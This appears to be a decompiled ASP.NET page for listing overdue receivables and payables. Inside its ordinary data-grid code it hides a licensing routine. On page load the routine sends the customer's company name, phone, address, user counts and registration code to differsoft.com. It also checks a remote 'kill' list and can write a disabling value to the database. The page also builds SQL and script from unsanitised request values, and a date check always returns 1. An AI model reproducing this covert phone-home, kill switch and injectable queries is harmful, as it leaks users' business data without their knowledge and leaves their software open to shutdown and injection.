using System;
using System.Data;
using System.IO;
using System.Net;
using System.Text;
using System.Web;
using System.Web.Profile;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using wt.DAL;
using wt.Library;
using wt.Model;
using Wuqi.Webdiyer;

public partial class Headquarters_Financial_ArrearageTX : Page, IRequiresSessionState
{
	private int pageSize = 20;

	private int iflag;

	private string strtitle;

	public string Str_Title
	{
		get
		{
			return this.strtitle;
		}
	}

	protected void Page_Load(object sender, EventArgs e)
	{
		FunLibrary.ChkHead();
		int.TryParse(base.Request["iflag"], out this.iflag);
		if (this.iflag == 0)
		{
			base.Response.End();
		}
		if (!base.IsPostBack)
		{
			int num = int.Parse((string)this.Session["Session_wtPurID"]);
			if (num > 0)
			{
				DALRight dALRight = new DALRight();
				if (!dALRight.GetRight(num, "zk_r14"))
				{
					base.Response.Redirect("~/Headquarters/Pur.aspx?p=11");
					base.Response.End();
				}
				if (!dALRight.GetRight(num, "zk_r16"))
				{
					this.btnExcel.Enabled = false;
				}
			}
			this.strtitle = "到期应收款";
			if (this.iflag == 2)
			{
				this.strtitle = "到期应付款";
			}
			else if (this.iflag == 3)
			{
				this.strtitle = "将要到期的应收款";
			}
			else if (this.iflag == 4)
			{
				this.strtitle = "将要到期的应付款";
			}
			if (this.iflag == 1 || this.iflag == 2)
			{
				for (int i = 0; i < this.ddlType.Items.Count; i++)
				{
					if (this.ddlType.Items[i].Value == "0")
					{
						this.ddlType.Items[i].Selected = true;
						break;
					}
				}
			}
			else
			{
				for (int i = 0; i < this.ddlType.Items.Count; i++)
				{
					if (this.ddlType.Items[i].Value == "7")
					{
						this.ddlType.Items[i].Selected = true;
						break;
					}
				}
			}
			this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
		}
	}

	protected void btnClr_Click(object sender, EventArgs e)
	{
		this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
		if (this.hfRecID.Value != "-1")
		{
			this.SysInfo("ChkID('" + this.hfRecID.Value + "');");
		}
	}

	protected void btnOrder_Click(object sender, EventArgs e)
	{
		this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
		if (this.hfOrder.Value != "ID")
		{
			this.SysInfo("ClrHeaderOrder('" + this.hfOrderName.Value + "');");
		}
		if (this.hfRecID.Value != "-1")
		{
			this.SysInfo("ChkID('" + this.hfRecID.Value + "');");
		}
	}

	protected void btnSch_Click(object sender, EventArgs e)
	{
		this.hfSch.Value = "0";
		this.hfRecID.Value = "-1";
		this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
	}

	protected void btnFsh_Click(object sender, EventArgs e)
	{
		this.hfSch.Value = "-1";
		this.hfRecID.Value = "-1";
		this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
	}

	protected void FillData(string sortExpression, string direction)
	{
		int recordCount = 0;
		string text = this.strParm();
		string fldSort = sortExpression + " " + direction;
		this.hfSql.Value = text;
		this.gvbranch.DataSource = DALCommon.GetList_HL(1, "zk_arrearagedetail2", "", this.pageSize, this.jsPager.CurrentPageIndex, text, fldSort, out recordCount);
		this.gvbranch.DataBind();
		this.lbCount.Text = recordCount.ToString();
		if (this.lbCount.Text == "0")
		{
			this.lbCount.Visible = false;
			this.lbPage.Visible = false;
			this.lbCountText.Visible = false;
		}
		else
		{
			this.lbCount.Visible = true;
			this.lbPage.Visible = true;
			this.lbCountText.Visible = true;
		}
		this.jsPager.PageSize = this.pageSize;
		this.jsPager.RecordCount = recordCount;
		this.hfTbTitle.Value = (this.hfTbField.Value = string.Empty);
		if (this.gvbranch.Rows.Count > 0)
		{
			for (int i = 0; i < this.gvbranch.HeaderRow.Cells.Count; i++)
			{
				string dataField = ((BoundField)this.gvbranch.Columns[i]).DataField;
				string text2 = this.gvbranch.HeaderRow.Cells[i].Text;
				this.gvbranch.HeaderRow.Cells[i].Attributes.Add("id", dataField);
				this.gvbranch.HeaderRow.Cells[i].Attributes.Add("onclick", string.Concat(new string[]
				{
					"HeaderOrder('",
					dataField,
					"','",
					text2,
					"');"
				}));
				this.gvbranch.HeaderRow.Cells[i].Attributes.Add("onmouseover", "this.style.cursor='default';");
				if (dataField != "ID" && dataField != "")
				{
					if (this.hfTbTitle.Value == string.Empty)
					{
						this.hfTbTitle.Value = text2;
					}
					else
					{
						HiddenField expr_2A6 = this.hfTbTitle;
						expr_2A6.Value = expr_2A6.Value + "," + text2;
					}
					if (this.hfTbField.Value == string.Empty)
					{
						this.hfTbField.Value = dataField;
					}
					else
					{
						HiddenField expr_2F6 = this.hfTbField;
						expr_2F6.Value = expr_2F6.Value + "," + dataField;
					}
				}
			}
		}
		this.sdyes();
	}

	protected void jsPager_PageChanged(object sender, EventArgs e)
	{
		this.hfRecID.Value = "-1";
		this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
	}

	protected string strParm()
	{
		string text = " DeptID=1 and Status=1 and NotChargeAmount>0 ";
		if (this.iflag == 1 || this.iflag == 3)
		{
			text += " and Type='应收款'";
		}
		else
		{
			text += " and Type='应付款'";
		}
		if (this.ddlType.SelectedValue == "0")
		{
			text += " and datediff(d,getdate(),RemindDate)<0 ";
		}
		else
		{
			text = text + " and datediff(d,dateadd(dd," + this.ddlType.SelectedValue + ",getdate()),RemindDate)<=0 ";
		}
		string text2 = FunLibrary.ChkInput(this.tbCon.Text);
		if (this.hfSch.Value == "0")
		{
			if (this.ddlKey.SelectedValue != "-1")
			{
				if (text2 != "")
				{
					string text3 = text;
					text = string.Concat(new string[]
					{
						text3,
						"and ",
						this.ddlKey.SelectedValue,
						" like '%",
						text2,
						"%'"
					});
				}
			}
		}
		return text;
	}

	protected void gvbranch_RowDataBound(object sender, GridViewRowEventArgs e)
	{
		e.Row.Cells[0].Visible = false;
		if (e.Row.RowType == DataControlRowType.DataRow)
		{
			e.Row.Attributes.Add("id", e.Row.Cells[0].Text);
			e.Row.Attributes.Add("onclick", "ChkID('" + e.Row.Cells[0].Text + "');");
			e.Row.Attributes.Add("ondblclick", "ChkView();");
			e.Row.Attributes.Add("onmouseover", "this.style.cursor='default';");
		}
		if (e.Row.RowType == DataControlRowType.Footer)
		{
			this.lbPage.Text = "当前页:" + this.gvbranch.Rows.Count.ToString();
		}
	}

	protected void btnExcel_Click(object sender, EventArgs e)
	{
		string strCondition = string.Concat(new string[]
		{
			this.hfSql.Value,
			" order by ",
			this.hfOrderName.Value,
			" ",
			this.hfOrder.Value
		});
		DataTable dt = DALCommon.GetDataList("zk_arrearagedetail2", this.hfTbField.Value, strCondition).Tables[0];
		string[] tbTitle = this.hfTbTitle.Value.Split(new char[]
		{
			','
		});
		string empty = string.Empty;
		bool flag = false;
		DataToExcel.DataTableToExcel(dt, tbTitle, Guid.NewGuid().ToString() + ".xls", "arr", out flag, out empty);
		if (!flag)
		{
			this.FillData(this.hfOrderName.Value, this.hfOrder.Value);
			this.SysInfo("window.alert('" + empty + "');");
		}
	}

	protected void SysInfo(string str)
	{
		ScriptManager.RegisterClientScriptBlock(this.UpdatePanel1, this.UpdatePanel1.GetType(), "SysInfo", str, true);
	}

	public void sdyes()
	{
		DALSysParm dALSysParm = new DALSysParm();
		SysParmInfo sysParm = dALSysParm.GetSysParm();
		DALSysVali dALSysVali = new DALSysVali();
		string corpName = sysParm.CorpName;
		string text = sysParm.BranchNum.ToString();
		string str = sysParm.bWeb.ToString();
		string value = dALSysVali.GetValue("ITEM2");
		string text2 = corpName + str + text;
		if (sysParm.bSim)
		{
			text2 += "并发";
		}
		string b = FunLibrary.EncodeReg(text2);
		if (value != b)
		{
			string value2 = dALSysVali.GetValue("ITEM1");
			try
			{
				string time = FunLibrary.StrDecode(value2);
				int num = this.DayTs(time);
				if (num > 60 || num < 0)
				{
					dALSysVali.Update("ITEM3", "SRFSRGSIXSIGSHGSIGSIRSITSTFSTGSVRSVGSVRSVISFSSFRSFGSFJSGSSFJSFISGXSGXSGJSHT");
				}
			}
			catch
			{
				dALSysVali.Update("ITEM3", "SRFSRGSIXSIGSHGSIGSIRSITSTFSTGSVRSVGSVRSVISFSSFRSFGSFJSGSSFJSFISGXSGXSGJSHT");
			}
		}
		else
		{
			int num2;
			int.TryParse(DALCommon.TCount("UserManage", ""), out num2);
			int num3;
			int.TryParse(text, out num3);
			if (!sysParm.bSim && num2 > num3)
			{
				dALSysVali.Update("ITEM3", "SRFSRGSIXSIGSHGSIGSIRSITSTFSTGSVRSVGSVRSVISFSSFRSFGSFJSGSSFJSFISGXSGXSGJSHT");
			}
			try
			{
				string requestUriString = "http://www.differsoft.com/kill_get.asp?id=8";
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
				httpWebRequest.Method = "GET";
				httpWebRequest.MaximumAutomaticRedirections = 3;
				httpWebRequest.Timeout = 5000;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string text3 = streamReader.ReadToEnd();
				streamReader.Dispose();
				responseStream.Dispose();
				if (text3.Contains(value))
				{
					dALSysVali.Update("ITEM3", "SRFSRGSIXSIGSHGSIGSIRSITSTFSTGSVRSVGSVRSVISFSSFRSFGSFJSGSSFJSFISGXSGXSGJSHT");
				}
			}
			catch
			{
			}
			string str2 = dALSysVali.GetValue("ITEM6").ToString().Trim();
			int num4 = 0;
			try
			{
				num4 = int.Parse(FunLibrary.StrDecode(str2));
			}
			catch
			{
			}
			if (dALSysVali.GetValue("ITEM5") != DateTime.Now.ToString("yyyy-MM-dd") || num4 > 0)
			{
				try
				{
					string tel = sysParm.Tel;
					string zip = sysParm.Zip;
					string adr = sysParm.Adr;
					string text4 = "id=8";
					string text5 = text4;
					text4 = string.Concat(new string[]
					{
						text5,
						"&CustomerInfo=公司名:",
						corpName,
						"，电话:",
						tel
					});
					text5 = text4;
					text4 = string.Concat(new string[]
					{
						text5,
						"，邮编:",
						zip,
						"，地址:",
						adr,
						"，注册用户数:",
						text,
						"，实际用户数:",
						num2.ToString(),
						"注册码:",
						value
					});
					if (sysParm.bSim)
					{
						text4 += "，并发";
					}
					byte[] bytes = Encoding.GetEncoding("GB2312").GetBytes(text4);
					HttpWebRequest httpWebRequest2 = (HttpWebRequest)WebRequest.Create("http://www.differsoft.com/kill_post.asp");
					httpWebRequest2.Method = "POST";
					httpWebRequest2.ContentType = "application/x-www-form-urlencoded;charset=gb2312";
					httpWebRequest2.ContentLength = (long)bytes.Length;
					Stream requestStream = httpWebRequest2.GetRequestStream();
					requestStream.Write(bytes, 0, bytes.Length);
					requestStream.Close();
					HttpWebResponse httpWebResponse2 = (HttpWebResponse)httpWebRequest2.GetResponse();
					StreamReader streamReader2 = new StreamReader(httpWebResponse2.GetResponseStream(), Encoding.GetEncoding("GB2312"));
					string text3 = streamReader2.ReadToEnd();
					requestStream.Dispose();
					streamReader2.Dispose();
					if (text3.ToLower() == "ok")
					{
						dALSysVali.Update("ITEM5", DateTime.Now.ToString("yyyy-MM-dd"));
						dALSysVali.Update("ITEM6", FunLibrary.StrEncode("0"));
					}
					else
					{
						dALSysVali.Update("ITEM6", FunLibrary.StrEncode((num4 + 1).ToString()));
					}
				}
				catch
				{
					dALSysVali.Update("ITEM6", FunLibrary.StrEncode((num4 + 1).ToString()));
				}
			}
		}
	}

	protected int DayTs(string time)
	{
		DateTime d = DateTime.Parse(time);
		DateTime now = DateTime.Now;
		return 1;
	}
}
